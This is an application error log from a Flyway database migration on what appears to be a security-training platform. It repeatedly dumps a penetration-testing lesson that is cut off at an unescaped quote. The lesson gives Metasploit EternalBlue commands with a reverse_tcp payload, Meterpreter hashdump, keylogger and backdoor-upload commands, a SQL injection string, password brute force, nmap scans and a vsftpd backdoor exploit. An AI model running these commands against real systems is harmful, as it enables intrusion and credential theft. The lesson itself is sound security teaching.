# Note vulnerable versions
```

**Step 4: Exploit a Vulnerability**
```bash
# Start Metasploit
msfconsole

# Search for vsftpd exploit (known vulnerability in Metasploitable)
search vsftpd

# Use the exploit
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST <metasploitable-ip>
exploit

# You should get a shell!
```

## Best Practices

### 1. Tool Maintenance
```bash
# Update Kali Linux regularly
sudo apt update && sudo apt full-upgrade -y

# Update Metasploit
msfupdate
```

### 2. Documentation
- Screenshot every step
- Save all command output
- Document findings immediately
- Use tools like CherryTree or KeepNote

### 3. Legal Compliance
- Only test systems you have permission to test
- Stay within defined scope
- Report findings responsibly
- Maintain confidentiality

### 4. Continuous Learning
- Follow security blogs (Offensive Security, Rapid7)
- Practice on legal platforms (HackTheBox, TryHackMe)
- Attend security conferences (DEF CON, Black Hat)
- Obtain certifications (OSCP, CEH, GPEN)

## Common Mistakes to Avoid

1. **Running scans without permission** → Legal consequences
2. **Using default settings** → Easily detected
3. **Not documenting findings** → Incomplete reports
4. **Ignoring false positives** → Wasted time
5. **Over-relying on automated tools** → Missing manual vulnerabilities

## Resources for Further Learning

### Official Documentation
- Kali Linux: https://www.kali.org/docs/
- Metasploit: https://docs.metasploit.com/
- Burp Suite: https://portswigger.net/burp/documentation
- Nmap: https://nmap.org/book/

### Practice Platforms
- HackTheBox: https://www.hackthebox.eu/
- TryHackMe: https://tryhackme.com/
- PentesterLab: https://pentesterlab.com/
- VulnHub: https://www.vulnhub.com/

### Video Tutorials
- IppSec (HackTheBox walkthroughs)
- The Cyber Mentor
- John Hammond
- LiveOverflow

## Quiz Preparation

Test your knowledge:

1. What is the difference between Kali Linux and a regular Linux distribution?
2. Name three phases of penetration testing and the primary tool for each.
3. What is Meterpreter and why is it powerful?
4. How does Burp Suite''s Proxy component work?
5. What is the purpose of Nmap''s NSE scripts?

## Next Steps

In the next module, you''ll learn **Reconnaissance and Information Gathering** techniques, where you''ll use these tools to discover information about target systems before attempting exploitation.

Remember: **With great power comes great responsibility.** Always use these tools ethically and legally!'
WHERE section_id = 1 AND name = 'Penetration Testing Tools Overview'

	at org.flywaydb.core.internal.command.DbMigrate.doMigrateGroup(DbMigrate.java:382)
	at org.flywaydb.core.internal.command.DbMigrate.lambda$applyMigrations$1(DbMigrate.java:272)
	at org.flywaydb.core.internal.jdbc.TransactionalExecutionTemplate.execute(TransactionalExecutionTemplate.java:55)
	at org.flywaydb.core.internal.command.DbMigrate.applyMigrations(DbMigrate.java:271)
	at org.flywaydb.core.internal.command.DbMigrate.migrateGroup(DbMigrate.java:244)
	at org.flywaydb.core.internal.command.DbMigrate.lambda$migrateAll$0(DbMigrate.java:139)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.execute(PostgreSQLAdvisoryLockTemplate.java:73)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.lambda$execute$0(PostgreSQLAdvisoryLockTemplate.java:56)
	at org.flywaydb.core.internal.jdbc.TransactionalExecutionTemplate.execute(TransactionalExecutionTemplate.java:55)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.execute(PostgreSQLAdvisoryLockTemplate.java:56)
	at org.flywaydb.database.postgresql.PostgreSQLConnection.lock(PostgreSQLConnection.java:96)
	at org.flywaydb.core.internal.schemahistory.JdbcTableSchemaHistory.lock(JdbcTableSchemaHistory.java:144)
	at org.flywaydb.core.internal.command.DbMigrate.migrateAll(DbMigrate.java:139)
	at org.flywaydb.core.internal.command.DbMigrate.migrate(DbMigrate.java:97)
	at org.flywaydb.core.Flyway.lambda$migrate$0(Flyway.java:202)
	at org.flywaydb.core.FlywayExecutor.execute(FlywayExecutor.java:215)
	at org.flywaydb.core.Flyway.migrate(Flyway.java:147)
	at com.cyberskill.MainVerticle.runDatabaseMigrations(MainVerticle.java:243)
	... 13 common frames omitted
Caused by: org.flywaydb.core.internal.sqlscript.FlywaySqlScriptException: Migration V4__Enhanced_Lesson_Content.sql failed
------------------------------------------------
SQL State  : 22P02
Error Code : 0
Message    : ERROR: invalid input syntax for type boolean: "# Penetration Testing Tools Overview

## Introduction

Professional penetration testers rely on a comprehensive toolkit to identify, exploit, and document security vulnerabilities. This lesson introduces the essential tools you'll use throughout your penetration testing career.

## 1. Kali Linux

### What is Kali Linux?

Kali Linux is a Debian-based Linux distribution specifically designed for penetration testing and security auditing. It comes pre-installed with over 600 security tools.

### Key Features

- **Pre-configured Environment**: Ready-to-use penetration testing platform
- **Regular Updates**: Maintained by Offensive Security
- **Extensive Tool Collection**: Covers all phases of penetration testing
- **Customizable**: Can be tailored to specific testing needs

### Installation Options

```bash
# Download from official website
https://www.kali.org/downloads/

# Installation methods:
1. Bare metal installation
2. Virtual machine (VMware/VirtualBox)
3. Docker container
4. Windows Subsystem for Linux (WSL)
5. Cloud deployment (AWS/Azure)
```

### Essential Kali Tools by Category

**Information Gathering:**
- nmap, masscan, recon-ng, theHarvester

**Vulnerability Analysis:**
- OpenVAS, Nikto, SQLMap, WPScan

**Exploitation:**
- Metasploit Framework, BeEF, Social Engineering Toolkit

**Post-Exploitation:**
- Mimikatz, PowerSploit, Empire

**Password Attacks:**
- John the Ripper, Hashcat, Hydra, Medusa

## 2. Metasploit Framework

### Overview

Metasploit is the world's most popular penetration testing framework, providing tools for discovering, exploiting, and validating vulnerabilities.

### Architecture

```
Metasploit Framework
├── Exploits (2000+)
├── Payloads (500+)
├── Auxiliary Modules (1000+)
├── Post-Exploitation Modules (300+)
└── Encoders & NOPs
```

### Basic Usage

```bash
# Start Metasploit console
msfconsole

# Search for exploits
msf6 > search type:exploit platform:windows smb

# Select an exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show required options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Set target
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# Set payload
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set local IP
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50

# Execute exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

### Meterpreter Shell

Once you gain access, Meterpreter provides powerful post-exploitation capabilities:

```bash
# System information
meterpreter > sysinfo

# List processes
meterpreter > ps

# Migrate to another process
meterpreter > migrate 1234

# Dump password hashes
meterpreter > hashdump

# Take screenshot
meterpreter > screenshot

# Enable keylogger
meterpreter > keyscan_start
meterpreter > keyscan_dump

# Upload/download files
meterpreter > upload /root/backdoor.exe C:\\Windows\\Temp
meterpreter > download C:\\Users\\Admin\\Documents\\sensitive.docx
```

## 3. Burp Suite

### Overview

Burp Suite is the leading web application security testing tool, used by security professionals worldwide.

### Editions

- **Community Edition**: Free, basic features
- **Professional Edition**: $449/year, advanced scanning
- **Enterprise Edition**: Continuous scanning for large organizations

### Key Components

#### 1. Proxy
Intercepts and modifies HTTP/HTTPS traffic between browser and server.

```
Browser → Burp Proxy → Web Server
         ↓
    Intercept & Modify
```

#### 2. Scanner (Pro only)
Automatically discovers vulnerabilities:
- SQL Injection
- Cross-Site Scripting (XSS)
- Command Injection
- Path Traversal
- And 100+ other vulnerability types

#### 3. Intruder
Automated customized attacks:

```
# Example: Password brute force
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=§password§

# Intruder will try:
password=password123
password=admin123
password=letmein
... (from wordlist)
```

#### 4. Repeater
Manually modify and resend requests:

```
# Original Request
GET /api/user/123 HTTP/1.1

# Modified Request (testing for IDOR)
GET /api/user/124 HTTP/1.1
GET /api/user/125 HTTP/1.1
```

#### 5. Sequencer
Analyzes randomness of session tokens:

```
Collected 10,000 session tokens
Analyzing entropy...
Result: WEAK - Predictable pattern detected
Recommendation: Implement cryptographically secure random number generator
```

### Practical Example: Finding SQL Injection

```
1. Configure browser to use Burp proxy (127.0.0.1:8080)
2. Navigate to target application
3. Submit a form with user input
4. Intercept the request in Burp
5. Send to Repeater
6. Modify parameter: username=admin"
  Position: 32
Location   : db/migration/V4__Enhanced_Lesson_Content.sql (C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\file:\C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\target\cyberskill-platform-1.0.0-fat.jar!\db\migration\V4__Enhanced_Lesson_Content.sql)
Line       : 210
Statement  : UPDATE lessons SET content = 
'# Penetration Testing Tools Overview

## Introduction

Professional penetration testers rely on a comprehensive toolkit to identify, exploit, and document security vulnerabilities. This lesson introduces the essential tools you''ll use throughout your penetration testing career.

## 1. Kali Linux

### What is Kali Linux?

Kali Linux is a Debian-based Linux distribution specifically designed for penetration testing and security auditing. It comes pre-installed with over 600 security tools.

### Key Features

- **Pre-configured Environment**: Ready-to-use penetration testing platform
- **Regular Updates**: Maintained by Offensive Security
- **Extensive Tool Collection**: Covers all phases of penetration testing
- **Customizable**: Can be tailored to specific testing needs

### Installation Options

```bash
# Download from official website
https://www.kali.org/downloads/

# Installation methods:
1. Bare metal installation
2. Virtual machine (VMware/VirtualBox)
3. Docker container
4. Windows Subsystem for Linux (WSL)
5. Cloud deployment (AWS/Azure)
```

### Essential Kali Tools by Category

**Information Gathering:**
- nmap, masscan, recon-ng, theHarvester

**Vulnerability Analysis:**
- OpenVAS, Nikto, SQLMap, WPScan

**Exploitation:**
- Metasploit Framework, BeEF, Social Engineering Toolkit

**Post-Exploitation:**
- Mimikatz, PowerSploit, Empire

**Password Attacks:**
- John the Ripper, Hashcat, Hydra, Medusa

## 2. Metasploit Framework

### Overview

Metasploit is the world''s most popular penetration testing framework, providing tools for discovering, exploiting, and validating vulnerabilities.

### Architecture

```
Metasploit Framework
├── Exploits (2000+)
├── Payloads (500+)
├── Auxiliary Modules (1000+)
├── Post-Exploitation Modules (300+)
└── Encoders & NOPs
```

### Basic Usage

```bash
# Start Metasploit console
msfconsole

# Search for exploits
msf6 > search type:exploit platform:windows smb

# Select an exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show required options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Set target
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# Set payload
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set local IP
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50

# Execute exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

### Meterpreter Shell

Once you gain access, Meterpreter provides powerful post-exploitation capabilities:

```bash
# System information
meterpreter > sysinfo

# List processes
meterpreter > ps

# Migrate to another process
meterpreter > migrate 1234

# Dump password hashes
meterpreter > hashdump

# Take screenshot
meterpreter > screenshot

# Enable keylogger
meterpreter > keyscan_start
meterpreter > keyscan_dump

# Upload/download files
meterpreter > upload /root/backdoor.exe C:\\Windows\\Temp
meterpreter > download C:\\Users\\Admin\\Documents\\sensitive.docx
```

## 3. Burp Suite

### Overview

Burp Suite is the leading web application security testing tool, used by security professionals worldwide.

### Editions

- **Community Edition**: Free, basic features
- **Professional Edition**: $449/year, advanced scanning
- **Enterprise Edition**: Continuous scanning for large organizations

### Key Components

#### 1. Proxy
Intercepts and modifies HTTP/HTTPS traffic between browser and server.

```
Browser → Burp Proxy → Web Server
         ↓
    Intercept & Modify
```

#### 2. Scanner (Pro only)
Automatically discovers vulnerabilities:
- SQL Injection
- Cross-Site Scripting (XSS)
- Command Injection
- Path Traversal
- And 100+ other vulnerability types

#### 3. Intruder
Automated customized attacks:

```
# Example: Password brute force
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=§password§

# Intruder will try:
password=password123
password=admin123
password=letmein
... (from wordlist)
```

#### 4. Repeater
Manually modify and resend requests:

```
# Original Request
GET /api/user/123 HTTP/1.1

# Modified Request (testing for IDOR)
GET /api/user/124 HTTP/1.1
GET /api/user/125 HTTP/1.1
```

#### 5. Sequencer
Analyzes randomness of session tokens:

```
Collected 10,000 session tokens
Analyzing entropy...
Result: WEAK - Predictable pattern detected
Recommendation: Implement cryptographically secure random number generator
```

### Practical Example: Finding SQL Injection

```
1. Configure browser to use Burp proxy (127.0.0.1:8080)
2. Navigate to target application
3. Submit a form with user input
4. Intercept the request in Burp
5. Send to Repeater
6. Modify parameter: username=admin' OR '1'='1
7. Observe response for SQL errors or unexpected behavior
8. If vulnerable, escalate to full exploitation
```

## 4. Nmap (Network Mapper)

### Overview

Nmap is the industry-standard tool for network discovery and security auditing.

### Basic Scans

```bash
# Ping scan (discover live hosts)
nmap -sn 192.168.1.0/24

# TCP SYN scan (stealth scan)
nmap -sS 192.168.1.100

# Service version detection
nmap -sV 192.168.1.100

# OS detection
nmap -O 192.168.1.100

# Aggressive scan (OS, version, scripts, traceroute)
nmap -A 192.168.1.100

# Scan specific ports
nmap -p 80,443,8080 192.168.1.100

# Scan all ports
nmap -p- 192.168.1.100
```

### NSE (Nmap Scripting Engine)

```bash
# Vulnerability scanning
nmap --script vuln 192.168.1.100

# SMB enumeration
nmap --script smb-enum-shares,smb-enum-users 192.168.1.100

# HTTP enumeration
nmap --script http-enum 192.168.1.100

# SSL/TLS testing
nmap --script ssl-enum-ciphers -p 443 192.168.1.100
```

### Output Formats

```bash
# Normal output
nmap -oN scan_results.txt 192.168.1.100

# XML output (for parsing)
nmap -oX scan_results.xml 192.168.1.100

# Grepable output
nmap -oG scan_results.gnmap 192.168.1.100

# All formats
nmap -oA scan_results 192.168.1.100
```

## Tool Selection Matrix

| Phase | Primary Tool | Alternative | Purpose |
|-------|--------------|-------------|---------|
| Reconnaissance | Nmap | Masscan | Network discovery |
| Web Testing | Burp Suite | OWASP ZAP | Web app security |
| Exploitation | Metasploit | Manual exploits | Vulnerability exploitation |
| Password Cracking | Hashcat | John the Ripper | Credential attacks |
| Post-Exploitation | Meterpreter | PowerShell Empire | Maintain access |

## Hands-On Lab Exercise

### Setup Your Testing Environment

**Step 1: Install Kali Linux**
```bash
# Download Kali Linux VM
# Import into VirtualBox/VMware
# Update system
sudo apt update && sudo apt upgrade -y
```

**Step 2: Install Metasploitable 2 (Vulnerable Target)**
```bash
# Download from SourceForge
# Import into same virtual network as Kali
# Default credentials: msfadmin/msfadmin
```

**Step 3: Practice Scanning**
```bash
# From Kali, scan Metasploitable
nmap -sV -A <metasploitable-ip>

# Identify open services
# Note vulnerable versions
```

**Step 4: Exploit a Vulnerability**
```bash
# Start Metasploit
msfconsole

# Search for vsftpd exploit (known vulnerability in Metasploitable)
search vsftpd

# Use the exploit
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST <metasploitable-ip>
exploit

# You should get a shell!
```

## Best Practices

### 1. Tool Maintenance
```bash
# Update Kali Linux regularly
sudo apt update && sudo apt full-upgrade -y

# Update Metasploit
msfupdate
```

### 2. Documentation
- Screenshot every step
- Save all command output
- Document findings immediately
- Use tools like CherryTree or KeepNote

### 3. Legal Compliance
- Only test systems you have permission to test
- Stay within defined scope
- Report findings responsibly
- Maintain confidentiality

### 4. Continuous Learning
- Follow security blogs (Offensive Security, Rapid7)
- Practice on legal platforms (HackTheBox, TryHackMe)
- Attend security conferences (DEF CON, Black Hat)
- Obtain certifications (OSCP, CEH, GPEN)

## Common Mistakes to Avoid

1. **Running scans without permission** → Legal consequences
2. **Using default settings** → Easily detected
3. **Not documenting findings** → Incomplete reports
4. **Ignoring false positives** → Wasted time
5. **Over-relying on automated tools** → Missing manual vulnerabilities

## Resources for Further Learning

### Official Documentation
- Kali Linux: https://www.kali.org/docs/
- Metasploit: https://docs.metasploit.com/
- Burp Suite: https://portswigger.net/burp/documentation
- Nmap: https://nmap.org/book/

### Practice Platforms
- HackTheBox: https://www.hackthebox.eu/
- TryHackMe: https://tryhackme.com/
- PentesterLab: https://pentesterlab.com/
- VulnHub: https://www.vulnhub.com/

### Video Tutorials
- IppSec (HackTheBox walkthroughs)
- The Cyber Mentor
- John Hammond
- LiveOverflow

## Quiz Preparation

Test your knowledge:

1. What is the difference between Kali Linux and a regular Linux distribution?
2. Name three phases of penetration testing and the primary tool for each.
3. What is Meterpreter and why is it powerful?
4. How does Burp Suite''s Proxy component work?
5. What is the purpose of Nmap''s NSE scripts?

## Next Steps

In the next module, you''ll learn **Reconnaissance and Information Gathering** techniques, where you''ll use these tools to discover information about target systems before attempting exploitation.

Remember: **With great power comes great responsibility.** Always use these tools ethically and legally!'
WHERE section_id = 1 AND name = 'Penetration Testing Tools Overview'

	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.handleException(DefaultSqlScriptExecutor.java:270)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.executeStatement(DefaultSqlScriptExecutor.java:225)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.execute(DefaultSqlScriptExecutor.java:128)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.executeOnce(SqlMigrationExecutor.java:68)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.lambda$execute$0(SqlMigrationExecutor.java:57)
	at org.flywaydb.core.internal.database.DefaultExecutionStrategy.execute(DefaultExecutionStrategy.java:27)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.execute(SqlMigrationExecutor.java:56)
	at org.flywaydb.core.internal.command.DbMigrate.doMigrateGroup(DbMigrate.java:374)
	... 30 common frames omitted
Caused by: org.postgresql.util.PSQLException: ERROR: invalid input syntax for type boolean: "# Penetration Testing Tools Overview

## Introduction

Professional penetration testers rely on a comprehensive toolkit to identify, exploit, and document security vulnerabilities. This lesson introduces the essential tools you'll use throughout your penetration testing career.

## 1. Kali Linux

### What is Kali Linux?

Kali Linux is a Debian-based Linux distribution specifically designed for penetration testing and security auditing. It comes pre-installed with over 600 security tools.

### Key Features

- **Pre-configured Environment**: Ready-to-use penetration testing platform
- **Regular Updates**: Maintained by Offensive Security
- **Extensive Tool Collection**: Covers all phases of penetration testing
- **Customizable**: Can be tailored to specific testing needs

### Installation Options

```bash
# Download from official website
https://www.kali.org/downloads/

# Installation methods:
1. Bare metal installation
2. Virtual machine (VMware/VirtualBox)
3. Docker container
4. Windows Subsystem for Linux (WSL)
5. Cloud deployment (AWS/Azure)
```

### Essential Kali Tools by Category

**Information Gathering:**
- nmap, masscan, recon-ng, theHarvester

**Vulnerability Analysis:**
- OpenVAS, Nikto, SQLMap, WPScan

**Exploitation:**
- Metasploit Framework, BeEF, Social Engineering Toolkit

**Post-Exploitation:**
- Mimikatz, PowerSploit, Empire

**Password Attacks:**
- John the Ripper, Hashcat, Hydra, Medusa

## 2. Metasploit Framework

### Overview

Metasploit is the world's most popular penetration testing framework, providing tools for discovering, exploiting, and validating vulnerabilities.

### Architecture

```
Metasploit Framework
├── Exploits (2000+)
├── Payloads (500+)
├── Auxiliary Modules (1000+)
├── Post-Exploitation Modules (300+)
└── Encoders & NOPs
```

### Basic Usage

```bash
# Start Metasploit console
msfconsole

# Search for exploits
msf6 > search type:exploit platform:windows smb

# Select an exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show required options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Set target
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# Set payload
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set local IP
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50

# Execute exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

### Meterpreter Shell

Once you gain access, Meterpreter provides powerful post-exploitation capabilities:

```bash
# System information
meterpreter > sysinfo

# List processes
meterpreter > ps

# Migrate to another process
meterpreter > migrate 1234

# Dump password hashes
meterpreter > hashdump

# Take screenshot
meterpreter > screenshot

# Enable keylogger
meterpreter > keyscan_start
meterpreter > keyscan_dump

# Upload/download files
meterpreter > upload /root/backdoor.exe C:\\Windows\\Temp
meterpreter > download C:\\Users\\Admin\\Documents\\sensitive.docx
```

## 3. Burp Suite

### Overview

Burp Suite is the leading web application security testing tool, used by security professionals worldwide.

### Editions

- **Community Edition**: Free, basic features
- **Professional Edition**: $449/year, advanced scanning
- **Enterprise Edition**: Continuous scanning for large organizations

### Key Components

#### 1. Proxy
Intercepts and modifies HTTP/HTTPS traffic between browser and server.

```
Browser → Burp Proxy → Web Server
         ↓
    Intercept & Modify
```

#### 2. Scanner (Pro only)
Automatically discovers vulnerabilities:
- SQL Injection
- Cross-Site Scripting (XSS)
- Command Injection
- Path Traversal
- And 100+ other vulnerability types

#### 3. Intruder
Automated customized attacks:

```
# Example: Password brute force
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=§password§

# Intruder will try:
password=password123
password=admin123
password=letmein
... (from wordlist)
```

#### 4. Repeater
Manually modify and resend requests:

```
# Original Request
GET /api/user/123 HTTP/1.1

# Modified Request (testing for IDOR)
GET /api/user/124 HTTP/1.1
GET /api/user/125 HTTP/1.1
```

#### 5. Sequencer
Analyzes randomness of session tokens:

```
Collected 10,000 session tokens
Analyzing entropy...
Result: WEAK - Predictable pattern detected
Recommendation: Implement cryptographically secure random number generator
```

### Practical Example: Finding SQL Injection

```
1. Configure browser to use Burp proxy (127.0.0.1:8080)
2. Navigate to target application
3. Submit a form with user input
4. Intercept the request in Burp
5. Send to Repeater
6. Modify parameter: username=admin"
  Position: 32
	at org.postgresql.core.v3.QueryExecutorImpl.receiveErrorResponse(QueryExecutorImpl.java:2712)
	at org.postgresql.core.v3.QueryExecutorImpl.processResults(QueryExecutorImpl.java:2400)
	at org.postgresql.core.v3.QueryExecutorImpl.execute(QueryExecutorImpl.java:367)
	at org.postgresql.jdbc.PgStatement.executeInternal(PgStatement.java:498)
	at org.postgresql.jdbc.PgStatement.execute(PgStatement.java:415)
	at org.postgresql.jdbc.PgStatement.executeWithFlags(PgStatement.java:335)
	at org.postgresql.jdbc.PgStatement.executeCachedSql(PgStatement.java:321)
	at org.postgresql.jdbc.PgStatement.executeWithFlags(PgStatement.java:297)
	at org.postgresql.jdbc.PgStatement.execute(PgStatement.java:292)
	at org.flywaydb.core.internal.jdbc.JdbcTemplate.executeStatement(JdbcTemplate.java:210)
	at org.flywaydb.core.internal.sqlscript.ParsedSqlStatement.execute(ParsedSqlStatement.java:97)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.executeStatement(DefaultSqlScriptExecutor.java:213)
	... 36 common frames omitted
2026-03-12 00:53:24.148 [vert.x-eventloop-thread-0] ERROR i.v.c.i.l.c.VertxIsolatedDeployer - Failed in deploying verticle
java.lang.RuntimeException: Database migration failed
	at com.cyberskill.MainVerticle.runDatabaseMigrations(MainVerticle.java:247)
	at com.cyberskill.MainVerticle.start(MainVerticle.java:87)
	at io.vertx.core.impl.DeploymentManager.lambda$doDeploy$5(DeploymentManager.java:210)
	at io.vertx.core.impl.ContextInternal.dispatch(ContextInternal.java:276)
	at io.vertx.core.impl.ContextInternal.dispatch(ContextInternal.java:258)
	at io.vertx.core.impl.ContextInternal.lambda$runOnContext$0(ContextInternal.java:56)
	at io.netty.util.concurrent.AbstractEventExecutor.runTask(AbstractEventExecutor.java:173)
	at io.netty.util.concurrent.AbstractEventExecutor.safeExecute(AbstractEventExecutor.java:166)
	at io.netty.util.concurrent.SingleThreadEventExecutor.runAllTasks(SingleThreadEventExecutor.java:470)
	at io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:569)
	at io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:997)
	at io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74)
	at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
	at java.base/java.lang.Thread.run(Thread.java:1447)
Caused by: org.flywaydb.core.internal.command.DbMigrate$FlywayMigrateException: Migration V4__Enhanced_Lesson_Content.sql failed
------------------------------------------------
SQL State  : 22P02
Error Code : 0
Message    : ERROR: invalid input syntax for type boolean: "# Penetration Testing Tools Overview

## Introduction

Professional penetration testers rely on a comprehensive toolkit to identify, exploit, and document security vulnerabilities. This lesson introduces the essential tools you'll use throughout your penetration testing career.

## 1. Kali Linux

### What is Kali Linux?

Kali Linux is a Debian-based Linux distribution specifically designed for penetration testing and security auditing. It comes pre-installed with over 600 security tools.

### Key Features

- **Pre-configured Environment**: Ready-to-use penetration testing platform
- **Regular Updates**: Maintained by Offensive Security
- **Extensive Tool Collection**: Covers all phases of penetration testing
- **Customizable**: Can be tailored to specific testing needs

### Installation Options

```bash
# Download from official website
https://www.kali.org/downloads/

# Installation methods:
1. Bare metal installation
2. Virtual machine (VMware/VirtualBox)
3. Docker container
4. Windows Subsystem for Linux (WSL)
5. Cloud deployment (AWS/Azure)
```

### Essential Kali Tools by Category

**Information Gathering:**
- nmap, masscan, recon-ng, theHarvester

**Vulnerability Analysis:**
- OpenVAS, Nikto, SQLMap, WPScan

**Exploitation:**
- Metasploit Framework, BeEF, Social Engineering Toolkit

**Post-Exploitation:**
- Mimikatz, PowerSploit, Empire

**Password Attacks:**
- John the Ripper, Hashcat, Hydra, Medusa

## 2. Metasploit Framework

### Overview

Metasploit is the world's most popular penetration testing framework, providing tools for discovering, exploiting, and validating vulnerabilities.

### Architecture

```
Metasploit Framework
├── Exploits (2000+)
├── Payloads (500+)
├── Auxiliary Modules (1000+)
├── Post-Exploitation Modules (300+)
└── Encoders & NOPs
```

### Basic Usage

```bash
# Start Metasploit console
msfconsole

# Search for exploits
msf6 > search type:exploit platform:windows smb

# Select an exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show required options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Set target
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# Set payload
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set local IP
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50

# Execute exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

### Meterpreter Shell

Once you gain access, Meterpreter provides powerful post-exploitation capabilities:

```bash
# System information
meterpreter > sysinfo

# List processes
meterpreter > ps

# Migrate to another process
meterpreter > migrate 1234

# Dump password hashes
meterpreter > hashdump

# Take screenshot
meterpreter > screenshot

# Enable keylogger
meterpreter > keyscan_start
meterpreter > keyscan_dump

# Upload/download files
meterpreter > upload /root/backdoor.exe C:\\Windows\\Temp
meterpreter > download C:\\Users\\Admin\\Documents\\sensitive.docx
```

## 3. Burp Suite

### Overview

Burp Suite is the leading web application security testing tool, used by security professionals worldwide.

### Editions

- **Community Edition**: Free, basic features
- **Professional Edition**: $449/year, advanced scanning
- **Enterprise Edition**: Continuous scanning for large organizations

### Key Components

#### 1. Proxy
Intercepts and modifies HTTP/HTTPS traffic between browser and server.

```
Browser → Burp Proxy → Web Server
         ↓
    Intercept & Modify
```

#### 2. Scanner (Pro only)
Automatically discovers vulnerabilities:
- SQL Injection
- Cross-Site Scripting (XSS)
- Command Injection
- Path Traversal
- And 100+ other vulnerability types

#### 3. Intruder
Automated customized attacks:

```
# Example: Password brute force
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=§password§

# Intruder will try:
password=password123
password=admin123
password=letmein
... (from wordlist)
```

#### 4. Repeater
Manually modify and resend requests:

```
# Original Request
GET /api/user/123 HTTP/1.1

# Modified Request (testing for IDOR)
GET /api/user/124 HTTP/1.1
GET /api/user/125 HTTP/1.1
```

#### 5. Sequencer
Analyzes randomness of session tokens:

```
Collected 10,000 session tokens
Analyzing entropy...
Result: WEAK - Predictable pattern detected
Recommendation: Implement cryptographically secure random number generator
```

### Practical Example: Finding SQL Injection

```
1. Configure browser to use Burp proxy (127.0.0.1:8080)
2. Navigate to target application
3. Submit a form with user input
4. Intercept the request in Burp
5. Send to Repeater
6. Modify parameter: username=admin"
  Position: 32
Location   : db/migration/V4__Enhanced_Lesson_Content.sql (C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\file:\C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\target\cyberskill-platform-1.0.0-fat.jar!\db\migration\V4__Enhanced_Lesson_Content.sql)
Line       : 210
Statement  : UPDATE lessons SET content = 
'# Penetration Testing Tools Overview

## Introduction

Professional penetration testers rely on a comprehensive toolkit to identify, exploit, and document security vulnerabilities. This lesson introduces the essential tools you''ll use throughout your penetration testing career.

## 1. Kali Linux

### What is Kali Linux?

Kali Linux is a Debian-based Linux distribution specifically designed for penetration testing and security auditing. It comes pre-installed with over 600 security tools.

### Key Features

- **Pre-configured Environment**: Ready-to-use penetration testing platform
- **Regular Updates**: Maintained by Offensive Security
- **Extensive Tool Collection**: Covers all phases of penetration testing
- **Customizable**: Can be tailored to specific testing needs

### Installation Options

```bash
# Download from official website
https://www.kali.org/downloads/

# Installation methods:
1. Bare metal installation
2. Virtual machine (VMware/VirtualBox)
3. Docker container
4. Windows Subsystem for Linux (WSL)
5. Cloud deployment (AWS/Azure)
```

### Essential Kali Tools by Category

**Information Gathering:**
- nmap, masscan, recon-ng, theHarvester

**Vulnerability Analysis:**
- OpenVAS, Nikto, SQLMap, WPScan

**Exploitation:**
- Metasploit Framework, BeEF, Social Engineering Toolkit

**Post-Exploitation:**
- Mimikatz, PowerSploit, Empire

**Password Attacks:**
- John the Ripper, Hashcat, Hydra, Medusa

## 2. Metasploit Framework

### Overview

Metasploit is the world''s most popular penetration testing framework, providing tools for discovering, exploiting, and validating vulnerabilities.

